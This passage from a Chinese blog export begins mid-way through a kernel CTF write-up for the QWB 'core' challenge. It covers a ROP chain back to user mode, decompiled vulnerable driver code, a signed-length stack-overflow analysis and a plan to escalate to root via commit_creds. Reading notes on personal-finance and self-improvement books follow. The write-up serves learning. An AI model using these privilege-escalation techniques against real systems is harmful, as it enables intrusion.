<p>方便起见，使用了内联汇编，由于编写风格是 Intel 汇编，编译时需要指定参数：<code>-masm=intel</code>。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>返回用户态</strong></p>
<p>由内核态返回用户态只需要：</p>
<ul>
<li><code>swapgs</code> 指令恢复用户态 GS 寄存器</li>
<li><code>sysretq</code> 或者 <code>iretq</code> 恢复到用户空间</li>
</ul>
<p>那么我们只需要在内核中找到相应的 gadget 并执行 <code>swapgs;iretq</code> 就可以成功着陆回用户态。</p>
<p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在返回用户态执行 <code>system()</code> 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题，因此在本地调试时若遇到此类问题，则可以将 <code>user_sp</code> 的值加减 <code>8</code> 以进行调整。</p>
<p>先看start.sh</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>开启了kaslr保护</p>
<p>init文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms <span class="comment">#将kallsyms备份到了tmp文件夹下。所以我们可以查看tmp目录下的kallsyms</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"> </span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"> </span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>然后之后设置了<code>poweroff -d 120 -f</code>，这句比较影响之后的调试，可以直接删掉，或者把时间改长一点。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>init_module()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>proc_create 是 Linux 内核中的一个函数，用于创建一个新的 &#x2F;proc 文件系统条目。这个函数常用于内核模块中，以便在 &#x2F;proc 文件系统下创建一个新的文件，使得用户空间程序可以通过这个文件与内核模块进行交互。<br>这里创建一个名为 ： &#x2F;proc&#x2F;core</p>
<p>对于这里的fops,也只对core_write,core_ioctl,core_release进行了注册。</p>
<p><strong>core_ioctl()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里core_ioctl中定义了三种操作，分别是调用<code>core_read()</code>，<code>设置全局变量off</code>，调用<code>core_copy_func()</code>。</p>
<p><strong>core_read()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28u</span>) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>copy_to_user()</code>,会把内核空间中的栈上的数据拷贝到<code>a1</code>,<code>a1</code>和<code>off</code>是我们可以控制的，因此可以利用这个函数来<code>泄露canary</code></p>
<p><strong>core_write()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>core_write是将至多0x800个字节从指定缓冲区复制到name中去</p>
<p><strong>core_copy_func()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞整数溢出造成栈溢出，传入的参数a1是__int64有符号的整数(无符号：size_t 或 unsigned __int64)，与63是无符号整数，如果传入一个负数即可进入else分支实现栈溢出。</p>
<p>最后调用<code>qmemcpy</code>时转成了<code>unsigned __int16</code>。所以只需要将<code>a1</code>最低两个字节的数据随便设置成一个能装下name的长度，然后其余字节都是0xff就行了。我这里最后构造的<code>a1</code>是<code>0xffffffffffff0100</code>。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>通过调试设置off，利用core_read函数去读取canary</li>
<li>构造ROP链，用core_write函数往name中写入数据</li>
<li>调用core_copy_func，将name的内容写入栈上变量v1中，造成栈溢出，调用commit_creds(prepare_kernel_cred(0))提权。</li>
</ol>
<p>再没有开kalsr和pie的情况下:</p>
<ul>
<li>原始无pie的vmlinux基址是0xffffffff81000000<br>commit_creds的地址是0xffffffff81000000+0x9c8e0<br>prepare_kernel_creds的地址是0xffffffff8109cce0</li>
</ul>
<p>在开启pie和kalsr的情况下，就要重新计算偏移。</p>
<p>start.sh</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 512M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.icpo \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr nopti mitigations=off&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>可以用ropper查找后续需要的gadget</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; rop</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记</title>
    <url>/2025/08/14/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h1><p>仅陈述书中的大概，可能含有个人的思索</p>
<h2 id="穷爸爸富爸爸"><a href="#穷爸爸富爸爸" class="headerlink" title="穷爸爸富爸爸"></a>穷爸爸富爸爸</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>老鼠赛跑，这是贯穿这本书的核心内容</p>
<ul>
<li><strong>“赛跑循环”的本质</strong><ul>
<li>代表普通人依赖工资生存的状态：工作→消费→偿还负债→继续工作，形成无法摆脱的循环</li>
<li><strong>关键问题</strong> ：收入增长伴随消费升级（如贷款买车、买房），被动收入缺失，导致始终无法积累资产</li>
</ul>
</li>
<li><strong>游戏目标：跳出循环</strong><ul>
<li>获胜条件是让<strong>被动收入（非工资收入）超过总支出</strong>，从而进入“快车道”（富人赛道），实现财务自由。</li>
</ul>
</li>
</ul>
<p>这就引出我们如何才能实现<strong>被动收入（非工资收入）超过总支出</strong> —— 具备会计、投资知识和钱的运动规律</p>
<p><img data-src="/../images/image-20250625182243740.png" alt="image-20250625182243740"></p>
<p>当你下意识地说出“我付不起”的时候，你的大脑就会停止思考；而如果你自问“我怎样才能付得起”，则会让你的大脑动起来。</p>
<h4 id="第一课富人不为钱工作"><a href="#第一课富人不为钱工作" class="headerlink" title="第一课	富人不为钱工作"></a>第一课	富人不为钱工作</h4><p>但生活可不是这样教你的。我得说生活才是最好的老师。大多数时候，生活不会和你说什么，它只是推着你转，每一次推，它都像是在说：‘喂，醒一醒，我要让你学点东西。’</p>
<p>穷人和中产阶级为钱而工作，富人不为钱工作。</p>
<p>正是因为有感情，我们才成为人。感情使我们更加真实，它是我们行动的动力。忠实于你的感情，<strong>以你喜欢的方式运用你的头脑和感情</strong>，不要让它们控制你。</p>
<p>我只希望你们有机会避开由恐惧和欲望组成的陷阱，按照<strong>你们喜欢的方式利用恐惧和欲望</strong>，而不要让它们控制你们。</p>
<p>人生实际上是在无知和觉醒之间的一场斗争。这种斗争实际上就是你时刻都要做的一种决定：是通过不断学习打开自己的心扉，还是封闭自己的头脑。</p>
<p>一直生活在恐惧中，从不追求自己的梦想，这是残酷的。为钱拼命工作，以为钱能买来快乐，这也是残酷的。半夜醒来想着还有许多账单要付是一种可怕的生活方式，以工资的多少来决定过什么样的生活不是真正的生活。认为工作会给你带来安全感其实是在欺骗自己。这些都很残酷，但我希望你们能尽可能地避开这些陷阱。我看过钱如何控制人们的生活，别让这些问题发生在你们身上，别让钱支配你们的生活。</p>
<p>对钱的无知导致了恐惧和贪婪。</p>
<p><strong>要学会让感情跟随你的思想，而不要让思想跟随你的感情。</strong></p>
<p>看见了别人看不见的。</p>
<h4 id="第二课为什么要教授财务知识"><a href="#第二课为什么要教授财务知识" class="headerlink" title="第二课	为什么要教授财务知识"></a>第二课	为什么要教授财务知识</h4><p>只有知识才能解决问题并创造财富，那些不是靠财务知识挣来的钱也不会长久。</p>
<p>从长远来看，重要的不是你挣了多少钱，而是你能留下多少钱，以及能够留住多久。</p>
<p>如果你想发财，就要学习财务知识。</p>
<p>如果你要去建造帝国大厦，你要做的第一件事就是挖个深坑，打牢地基。如果你只是想在郊区盖个小屋，你只须用混凝土打15厘米厚的地基就够了。大多数人在努力致富时，总是试图在15厘米厚的混凝土上建造帝国大厦。</p>
<p>现在，会计可能是世界上最乏味的学科了，也可能是最让人弄不明白的学科。但如果你想一直富有下去，它又可能是最重要的学科。</p>
<p>在会计上，”他接着说，“**关键不是数字，而是数字要告诉你的东西。**它的作用就像词语一样，虽然它不是词语，但它能告诉你词语不能告诉你的东西。</p>
<p><strong>资产是能把钱放进你口袋里的东西。负债是把钱从你口袋里取走的东西。</strong></p>
<p>看不懂关于财务的文字或读不懂数字的含义，是产生财务问题的根本原因。</p>
<p>我已经说过很多次，我们去学校学习以获取知识和专业技能，这两者都很重要，我们需要学会用专业技能谋生。（在人的早期阶段，专业技能和财务知识一样重要）</p>
<p>当我还是孩子时，我的爸爸告诉我日本人注重3种力量：剑（专业知识）、宝石（金钱的力量）和镜子（自知的力量）。</p>
<p><strong>当我想要换一所大一点的房子时，我会先买入一些资产，让它们创造能够支付这所房子的现金流。</strong></p>
<p>用资产项中的剩余现金进行再投资。</p>
<p>富人买入资产。穷人只有支出。中产阶级购买自以为是资产的负债。</p>
<h4 id="第三课关注自己的事业"><a href="#第三课关注自己的事业" class="headerlink" title="第三课	关注自己的事业"></a>第三课	关注自己的事业</h4><p>你的事业的重心是你的资产项，而不是你的收入项。</p>
<p>真正的资产可以分为以下几类：<br>	1．不需我到场就可以正常运作的业务。我拥有它们，但由别人经营和管理。<br>如果我必须在那儿工作，那它就不是我的事业而是我的职业了；<br>	2．股票；<br>	3．债券；<br>	4．共同基金；<br>	5．能够产生收入的房地产；<br>	6．票据（借据）；<br>	7．版税，如音乐、手稿、专利；<br>	8．其他任何有价值、可产生收入或有增值潜力并且有很好销路的东西。</p>
<p>但是如果你喜爱你所投资的对象，了解它并懂得游戏的规则，风险就会降低。</p>
<p>当我说关注自己的事业时，我的意思是建立自己牢固的资产。**一旦把1美元投入了资产项，就不要让它出来。**你应该这么想，这1美元进了你的资产项，它就成了你的雇员。关于钱，最妙的就是让它可以一天24小时不间断工作，还能为你的子孙后代服务。你要照常去工作，做个努力的雇员，但要不断构筑你的资产项。</p>
<p>富人与穷人一个重要的区别就是：富人最后才买奢侈品，而穷人和中产阶级会先买下诸如大房子、珠宝、皮衣、宝石、游艇等奢侈品，因为他们想让自己看上去很富有。</p>
<p>真正的奢侈品是对投资和积累真正资产的奖励。</p>
<p>在你花时间投资并创建自己的事业之后，就准备好迎接那神奇的秘密吧——**富人的最大秘密。**这个秘密铺平了富人的致富之路，在路的尽头你会由于付出时间和关注自己的事业而获得回报。</p>
<h4 id="第四课税收的历史和公司的力量"><a href="#第四课税收的历史和公司的力量" class="headerlink" title="第四课	税收的历史和公司的力量"></a>第四课	税收的历史和公司的力量</h4><p>真正的资本家则利用他们的财务知识逃脱了。</p>
<p>在我跟他学习的这些年中，他总在提醒我知识就是力量，而且钱越多，就越需要知识<br>管理它，使它继续增加。</p>
<p>我们还需要了解法律系统是如何运作的。如果你对法律一无所知，就很容易被欺负；如果你了解法律，你就有还击的机会。</p>
<p>我的钱为我挣回更多的钱。在我的资产中，每一块钱都是一名雇员，它们努力工作并带回更多的雇员，而且还能用税前收入为我购买新的保时捷。</p>
<p>财商是由这4项主要技能组成的：<br>	1．财务知识。即阅读理解数字的能力。<br>	2．投资策略。即以钱生钱的科学。<br>	3．市场、供给与需求。贝尔提供了市场所需要的东西，比尔·盖茨也是如此。用2万美元买了一套值7.5万美元的房子，以6万美元的价格卖出，也就是抓住了市场所创造的机会。在市场上，总是有买方，就有卖方。<br>	4．法律规章。要熟悉有关会计、公司方面的法律以及各州和国家的法规。我们必须按规则来进行“游戏”</p>
<p>但我仍要说，只要你拥有一种合法资产，我就可以找出以企业的形式提供的好处和保护。</p>
<p>财商实际上是技巧和才能的结合，以上所列的4项技能构成了基础的理财能力。</p>
<h4 id="第五课富人的投资"><a href="#第五课富人的投资" class="headerlink" title="第五课	富人的投资"></a>第五课	富人的投资</h4><p>一旦我们离开学校，大部分人就会意识到只有大学文凭或好成绩是远远不够的。在校园之外的现实生活里，有许多东西比好成 绩 更 为 重 要 ， 人 们 称 之 为 “ 魄 力 ” 、 “ 勇 气 ” 、 “ 毅<br>力 ” 、 “ 胆 量 ” 、 “ 气 势 ” 、 “ 精 明 ” 、 “ 勇 敢 ” 、 “ 坚 强”、“才华横溢”，等等。无论它们的名称是什么，它们都比学校的成绩更能从根本上决定人们的未来。</p>
<p>以我的个人经验来看，要成为财务上的天才既需要专业知识，又需要足够的勇气。</p>
<p>在我的班上，我极力劝说学生们要学着去冒险，要勇敢，把畏难情绪转化成力量和智慧。</p>
<p>为什么要去冒险？为什么必须永不停止地提高自己的财商？为什么必须懂得财务知识？<br>对此我的回答是：“就是为了获得更多的选择机会。”</p>
<p>当你想要的没有出现时，你能想出多少种理财方法来把一笔小钱变成数百万美元。这就要看你在解决财务问题上有怎样的创造性了。</p>
<p>那么，为什么你想提高自己的理财能力呢？因为你想成为能够自己创造机遇的人。</p>
<p>我们唯一的，也是最重要的资产是我们的头脑。</p>
<p>不是我必须这么做，而是我想要这么做，这是一个令人着迷的学习过程。</p>
<p><strong>如果投资机会太复杂而我又弄不明白，我就不会去投资。</strong></p>
<p><img data-src="/../images/image-20250625193547820.png" alt="image-20250625193547820"></p>
<p>真正炙手可热的交易不会留给新手。一般来说，能使富者更富的最好的交易总是为那些精通游戏规则的人准备的。</p>
<p>提高财商的另一个方面，就是让自己拥有更多的机会。你的财商越高，你就越容易<br>分清一项交易是好还是坏。</p>
<p><strong>在任何一项投资中，成功的办法都是运用你的技术知识、智慧以及对于这个游戏的热爱来<br>减少意外、降低风险。当然，风险总是存在的，但你的财商可以提高你应付意外的能力。</strong></p>
<p>好机会是用你的脑子而不是用你的眼睛看到的。</p>
<p>但是记住要以轻松的心态去面对，毕竟这只是一场游戏。有时你赢了，有时你还要继续学习，但是一定要从中找到乐趣。</p>
<p>然而，如果你看看人类学习的过程，就会明白我们其实就是<strong>在犯错误的过程中学到知识的</strong>。我们从跌倒中学会了走路，如果我们从不跌倒，也就永远学不会走路。学骑自行车也是同样的道理，尽管我的膝盖上仍有伤疤，但今天我骑车时已毫不费力了。致富也是同样的道理，但不幸的是，大部分贫穷的主要原因就在于他们太担心失去。胜利者不害怕失败，但失败者害怕。失败是成功过程中的一个组成部分，如果避开失败，也就不会成功。</p>
<h4 id="第六课学会不为钱工作"><a href="#第六课学会不为钱工作" class="headerlink" title="第六课	学会不为钱工作"></a>第六课	学会不为钱工作</h4><p>这句话的意思是说，大部分人需要学习和掌握不止一项技能，只有这样他们的收入才能获得显著增长。</p>
<p>相反，我劝告年轻人在找工作时要看能从中学到什么，而不是只看能挣多少钱。在选择某种职业或陷入“老鼠赛跑”的陷阱之前，要仔细看看脚下的路，弄清楚自己到底想获得什么技能。</p>
<p>多级营销公司。这类公司多半能够提供良好的培训项目，帮助人们克服因失败造成的沮丧和恐惧心理，这种心理往往是导致人们不成功的主要原因。</p>
<p>生活就像去健身房，最痛苦的事情是作出锻炼身体的决定，一旦你过了这一关，以后的事情就好办了。有很多次，我害怕去健身房，但是只要我去了并开始运动，就会感到非常愉快。健身之后我总是很高兴，因为我说服了自己坚持了下来。</p>
<p>最重要的专门技能是销售和对市场营销的理解。销售技能是个人成功的基本技能，它涉及与其他人的交往，包括与顾客、雇员、老板、配偶和孩子。而沟通能力，如书面表达、口头表达及谈判能力等对一个人的成功来说更是至关重要。我就是通过学习各种课程、听教学磁带等来扩展知识并不断提高自己的这一技能的。</p>
<h4 id="克服困难"><a href="#克服困难" class="headerlink" title="克服困难"></a>克服困难</h4><p>掌握财务知识的人有时候还是不能积累丰厚的资产项，其主要原因有5个：</p>
<ol>
<li>恐惧心理。对可能亏钱的恐惧心理。</li>
</ol>
<p>我从未遇见不曾打丢一球的高尔夫球选手，也从未见过不曾伤心过的恋人，更未见过从不亏钱的富人。</p>
<p>失败会激励胜利者，击垮失败者。这是胜利者最大的秘密，也是失败者所不知道的秘密。胜利者最大的秘密是失败能<br>够激励他们取胜，所以他们不怕失败。</p>
<p>爱迪生不追求平衡，他集中精力于某样东西；比尔·盖茨也不追求平衡；唐纳德·川普把注意力仅放在一点上；乔治·巴顿从不把坦克部署在很长的战线上，而是集中起来攻击德国防线上最薄弱的地方，与此相反，法国人构筑了漫长的马其诺防线，其结局众所周知。</p>
<ol start="2">
<li><p>愤世嫉俗。</p>
</li>
<li><p>懒惰。</p>
</li>
</ol>
<p>压力迫使我努力工作，迫使我去思考，最重要的是迫使我在钱的问题上更精明、更积极主动。</p>
<ol start="4">
<li>不良习惯。</li>
</ol>
<p>我强迫自己考虑如何挣到额外的钱，就好比我去健身房做负重练习，我精神上的‘金钱肌肉’越发达，我就越强大。</p>
<ol start="5">
<li>自负。</li>
</ol>
<h4 id="开始行动"><a href="#开始行动" class="headerlink" title="开始行动"></a>开始行动</h4><p>我建议你采取以下10个步骤来开发上帝赐予你的才能，这种才能只有你才可以控制：</p>
<ol>
<li>我需要一个超现实的理由——精神的力量。</li>
<li>每天作出自己的选择——选择的力量。</li>
<li>慎重地选择朋友——关系的力量。</li>
<li>掌握一种模式，然后再学习一种新的模式——快速学习的力量。</li>
<li>首先支付自己——自律的力量。如果你控制不了自己，就别想着致富。</li>
</ol>
<p>不要背上数额过大的债务包袱。要保持低支出。首先增加自己的资产，然后，再用资产项产生的现金流来买大房子或好车子。陷在“老鼠赛跑”中不是明智的选择。</p>
<p>当你资金短缺时，让压力去发挥作用，而不要动用你的储蓄或资本。利用这种压力来激发你的理财天赋，想出新办法挣到更多的钱，然后再支付账单。这样做，不但能让你赚到钱，还能提高你的财商。</p>
<ol start="6">
<li>给你的经纪人以优厚的报酬——好建议的力量。</li>
<li>做一个“印第安给予者”——无私的力量。</li>
<li>用资产来购买奢侈品——专注的力量。</li>
<li>对英雄的崇拜——神话的力量。</li>
<li>先予后取——给予的力量。</li>
</ol>
<h3 id="思索"><a href="#思索" class="headerlink" title="思索"></a>思索</h3><p>不要让一时的情绪来做出决定。</p>
<h2 id="穷查理宝典"><a href="#穷查理宝典" class="headerlink" title="穷查理宝典"></a>穷查理宝典</h2><h2 id="认知驱动"><a href="#认知驱动" class="headerlink" title="认知驱动"></a>认知驱动</h2><h3 id="导言"><a href="#导言" class="headerlink" title="导言"></a>导言</h3><p>重要信息：知道和做到之间存在巨大的鸿沟</p>
<p>有时候据大多数的行动或者“努力”并不是真正的我想要，而是被一个无形的手推着走——<strong>焦虑驱动</strong></p>
<p>这种有毒的系统会带来三个恶性后果：</p>
<ul>
<li>方向模糊。让我们活得像一个无头苍蝇，去追逐热点</li>
<li>过程极其痛苦，能量消耗巨大。靠焦虑驱动的感觉是我应该做，而不是我想要做，这就意味着你做的每一件事本质上都是在对抗自己的天性——原因：人的意志力有限</li>
<li>结果甚微，无法形成积累。</li>
</ul>
<h3 id="如何破解有毒系统？"><a href="#如何破解有毒系统？" class="headerlink" title="如何破解有毒系统？"></a><strong>如何破解有毒系统？</strong></h3><p>一套极其严谨、可执行的工程蓝图——价值创造飞轮</p>
<p>这个飞轮是认知驱动的核心构造，它有三个环环相扣、缺一不可的组件构成：</p>
<ul>
<li>第一个核心部件——目标系统，也就是你的北极星，不仅仅是飞轮的导航，也是飞轮的高品质原料。这个部件要解决的是<strong>驱动力质</strong>的问题。如一台内燃机和所加的燃料</li>
<li>第二个核心部件——行动系统，也就是最小化启动器，它不仅仅是飞轮的点火装置，更是整个系统破局的关键。这个部件要解决的是物理学和心理学上都存在的<strong>初始惯性问题</strong>。如推动一个静止的物体和维持一个运动的物体显然是前者需要的力更多，这个部件就是要让我们用一点力来撬动整个系统</li>
<li>第三个核心部件——反馈系统，也就是那个进化循环器，它不仅仅是飞轮的核心，更是一台自我进化的永动机。这个部件要解决的是所有成长中最核心的难题：<strong>如何实现持续的、指数级的进化？</strong>，同时他也是一套能实现复利增长的闭环系统，天才之处：把每一次行动的输出结果，通过反馈这个渠道重新输入到系统中，用于指导和优化下一次的行动</li>
</ul>
<h3 id="把这三个部件从理论图纸变为手中可用的强大工具"><a href="#把这三个部件从理论图纸变为手中可用的强大工具" class="headerlink" title="把这三个部件从理论图纸变为手中可用的强大工具"></a><strong>把这三个部件从理论图纸变为手中可用的强大工具</strong></h3><p>欢迎来到锻造车间，我们要锻造整个“价值创造飞轮“的三个核心部件</p>
<ul>
<li>锻造部件一：找到你的“北极星”目标。<ul>
<li>利己的目标是一个封闭系统，它的动力完全来源于你的”个人欲望“（欲望的满足带来的是更大的空虚焦虑，不是幸福），而且这种反馈给自己的是自我感受和银行数字，<strong>这种反馈很容易让我们在遇到困难时，因为感觉不好而迅速放弃</strong>。</li>
<li>一个开放系统的目标——利他，原因：动力来源从个人欲望扩展到了他人的需求，世界的痛点和需求是无限的，所以你的动力也是无限的，更重要的是你拥有了一个极其丰富和客观的外部反馈系统。</li>
<li>三叶草模型解决如何找到适合自己的利他目标<ul>
<li>第一片叶子，是你的激情区（最直接的就是愿意不给钱也去钻研他它、了解它）可能小也可能大诚实的写下来这是最原始的能量来源</li>
<li>第二片叶子，是你的禀赋区（你做什么比别人稍微轻松一点？）不是碾压众人，而是你感觉自己做起来比身边大多数人稍微轻松一点、更有感觉的事情，把这些感觉你好像还行的能力列出来。</li>
<li>第三片叶子，是最关键的圈，是价值区（他人的痛点和渴望是什么？）要善于从生活中发现</li>
</ul>
</li>
<li>三片叶子的交汇地带可以重点考虑——就是北极星目标</li>
</ul>
</li>
<li>锻造部件二：最小化启动器<ul>
<li>为什么计划了很多宏伟的、有前景的目标还没开始就启动失败了。原因是我们大脑的机制：节省能量和规避风险，但在今天点给我们需要做一些有创造性的、需要长期投入的事情时，它就成了一个巨大的刹车系统。</li>
